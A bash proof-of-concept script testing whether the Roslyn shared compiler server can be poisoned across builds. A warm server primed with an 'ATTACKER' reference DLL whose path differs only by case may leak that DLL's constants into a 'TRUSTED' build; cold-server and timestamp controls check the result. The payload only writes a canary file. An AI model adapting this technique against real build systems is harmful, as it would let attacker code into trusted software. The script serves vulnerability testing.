#!/usr/bin/env bash
set -euo pipefail

SDK_PREFIX="$1"
ROOT="$LAB_ROOT/vbcs-$SDK_PREFIX"
ROOT="$(printf '%s' "$ROOT" | tr '.' '-')"
rm -rf "$ROOT"
mkdir -p "$ROOT"

SDK_VERSION="$(dotnet --list-sdks | awk -v p="$SDK_PREFIX" '$1 ~ ("^" p "\\.") {v=$1} END {print v}')"
if [[ -z "$SDK_VERSION" ]]; then
  echo "No SDK found for prefix $SDK_PREFIX" >&2
  dotnet --list-sdks
  exit 40
fi

cat > "$ROOT/global.json" <<EOF
{
  "sdk": {
    "version": "$SDK_VERSION",
    "rollForward": "disable"
  }
}
EOF

export RoslynCommandLineLogFile="$ROOT/roslyn-command-line.log"
export VBCS_CANARY="$ROOT/trusted-canary.txt"

echo "SDK_PREFIX=$SDK_PREFIX"
echo "SDK_VERSION=$SDK_VERSION"
echo "ROOT=$ROOT"
echo "RoslynCommandLineLogFile=$RoslynCommandLineLogFile"

make_ref() {
  local dir="$1"
  local allow="$2"
  local marker="$3"
  mkdir -p "$dir/src"
  cat > "$dir/src/Ref.csproj" <<EOF
<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <TargetFramework>net8.0</TargetFramework>
    <AssemblyName>SecurityRef</AssemblyName>
    <RootNamespace>SecurityRef</RootNamespace>
    <Deterministic>true</Deterministic>
    <GenerateAssemblyInfo>true</GenerateAssemblyInfo>
  </PropertyGroup>
</Project>
EOF
  cat > "$dir/src/Policy.cs" <<EOF
namespace SecurityRef;
public static class Policy
{
    public const bool AllowCanary = $allow;
    public const string Marker = "$marker";
}
EOF
  (
    cd "$dir/src"
    dotnet build -c Release -p:UseSharedCompilation=false --nologo
  )
  cp "$dir/src/bin/Release/net8.0/SecurityRef.dll" "$dir/Ref.dll"
}

PAIR="$ROOT/pair"
LOW="$PAIR/a"
HIGH="$PAIR/A"
make_ref "$LOW" "true" "ATTACKER"
make_ref "$HIGH" "false" "TRUSTED"

FIXED="202609251234.56"
touch -t "$FIXED" "$LOW/Ref.dll" "$HIGH/Ref.dll"

echo "LOW_PATH=$LOW/Ref.dll"
echo "HIGH_PATH=$HIGH/Ref.dll"
echo "LOW_TIMESTAMP=$(python3 -c 'import os,sys,datetime; print(datetime.datetime.fromtimestamp(os.stat(sys.argv[1]).st_mtime, datetime.timezone.utc).isoformat())' "$LOW/Ref.dll")"
echo "HIGH_TIMESTAMP=$(python3 -c 'import os,sys,datetime; print(datetime.datetime.fromtimestamp(os.stat(sys.argv[1]).st_mtime, datetime.timezone.utc).isoformat())' "$HIGH/Ref.dll")"
echo "LOW_SHA256=$(shasum -a 256 "$LOW/Ref.dll" | awk '{print $1}')"
echo "HIGH_SHA256=$(shasum -a 256 "$HIGH/Ref.dll" | awk '{print $1}')"
ls -ldi "$LOW" "$HIGH"
ls -li "$LOW/Ref.dll" "$HIGH/Ref.dll"

mkdir -p "$ROOT/primer" "$ROOT/trusted"
cat > "$ROOT/primer/Primer.csproj" <<EOF
<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net8.0</TargetFramework>
    <UseSharedCompilation>true</UseSharedCompilation>
  </PropertyGroup>
  <ItemGroup>
    <Reference Include="SecurityRef">
      <HintPath>$LOW/Ref.dll</HintPath>
      <Private>false</Private>
    </Reference>
  </ItemGroup>
</Project>
EOF
cat > "$ROOT/primer/Program.cs" <<'EOF'
using System;
using SecurityRef;
Console.WriteLine($"PRIMER_METADATA={Policy.Marker}:{Policy.AllowCanary}");
EOF

cat > "$ROOT/trusted/Trusted.csproj" <<EOF
<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net8.0</TargetFramework>
    <UseSharedCompilation>true</UseSharedCompilation>
  </PropertyGroup>
  <ItemGroup>
    <Reference Include="SecurityRef">
      <HintPath>$HIGH/Ref.dll</HintPath>
      <Private>false</Private>
    </Reference>
  </ItemGroup>
</Project>
EOF
cat > "$ROOT/trusted/Program.cs" <<'EOF'
using System;
using System.IO;
using SecurityRef;

Console.WriteLine($"TRUSTED_COMPILED_MARKER={Policy.Marker}");
Console.WriteLine($"TRUSTED_COMPILED_ALLOW={Policy.AllowCanary}");
if (Policy.AllowCanary)
{
    var canary = Environment.GetEnvironmentVariable("VBCS_CANARY");
    if (!string.IsNullOrEmpty(canary))
        File.WriteAllText(canary, "VBCS_ATTACKER_METADATA_CANARY");
}
EOF

(
  cd "$ROOT"
  dotnet build-server shutdown || true
)
rm -f "$RoslynCommandLineLogFile" "$VBCS_CANARY"

echo "=== PRIME BUILD ==="
(
  cd "$ROOT/primer"
  dotnet build -c Release -p:UseSharedCompilation=true --nologo
)
echo "=== SERVER AFTER PRIME ==="
ps -axo pid=,ppid=,command= | grep -E '[V]BCSCompiler|[c]sc.dll' || true

echo "=== TRUSTED BUILD (WARM SERVER) ==="
(
  cd "$ROOT/trusted"
  rm -rf bin obj
  dotnet build -c Release -p:UseSharedCompilation=true --nologo
)
echo "=== SERVER AFTER TRUSTED BUILD ==="
ps -axo pid=,ppid=,command= | grep -E '[V]BCSCompiler|[c]sc.dll' || true

rm -f "$VBCS_CANARY"
echo "=== RUN TRUSTED OUTPUT (WARM BUILD) ==="
(
  cd "$ROOT/trusted"
  dotnet bin/Release/net8.0/Trusted.dll
)
WARM_CANARY=false
if [[ -f "$VBCS_CANARY" ]]; then
  WARM_CANARY=true
  echo "WARM_CANARY_CONTENTS=$(cat "$VBCS_CANARY")"
fi
echo "WARM_CANARY=$WARM_CANARY"

echo "=== COLD CONTROL ==="
(
  cd "$ROOT"
  dotnet build-server shutdown || true
)
rm -f "$VBCS_CANARY"
(
  cd "$ROOT/trusted"
  rm -rf bin obj
  dotnet build -c Release -p:UseSharedCompilation=true --nologo
  dotnet bin/Release/net8.0/Trusted.dll
)
COLD_CANARY=false
if [[ -f "$VBCS_CANARY" ]]; then
  COLD_CANARY=true
  echo "COLD_CANARY_CONTENTS=$(cat "$VBCS_CANARY")"
fi
echo "COLD_CANARY=$COLD_CANARY"

echo "=== TIMESTAMP CONTROL ==="
(
  cd "$ROOT"
  dotnet build-server shutdown || true
)
rm -f "$VBCS_CANARY"
touch -t "$FIXED" "$LOW/Ref.dll"
touch -t "202609251235.58" "$HIGH/Ref.dll"
(
  cd "$ROOT/primer"
  rm -rf bin obj
  dotnet build -c Release -p:UseSharedCompilation=true --nologo
)
(
  cd "$ROOT/trusted"
  rm -rf bin obj
  dotnet build -c Release -p:UseSharedCompilation=true --nologo
  dotnet bin/Release/net8.0/Trusted.dll
)
TS_CANARY=false
if [[ -f "$VBCS_CANARY" ]]; then
  TS_CANARY=true
  echo "TS_CANARY_CONTENTS=$(cat "$VBCS_CANARY")"
fi
echo "TIMESTAMP_CONTROL_CANARY=$TS_CANARY"

echo "=== COMPILER SERVER LOG PID SUMMARY ==="
if [[ -f "$RoslynCommandLineLogFile" ]]; then
  grep -E 'VBCSCompiler [0-9]+|RequestId|Completed|Connection' "$RoslynCommandLineLogFile" | tail -n 120 || true
else
  echo "NO_ROSLYN_LOG=true"
fi

if [[ "$WARM_CANARY" == "true" && "$COLD_CANARY" == "false" && "$TS_CANARY" == "false" ]]; then
  echo "VBCS_CROSS_BUILD_POISONING_CONFIRMED=true"
  exit 0
fi

echo "VBCS_CROSS_BUILD_POISONING_CONFIRMED=false"
exit 0
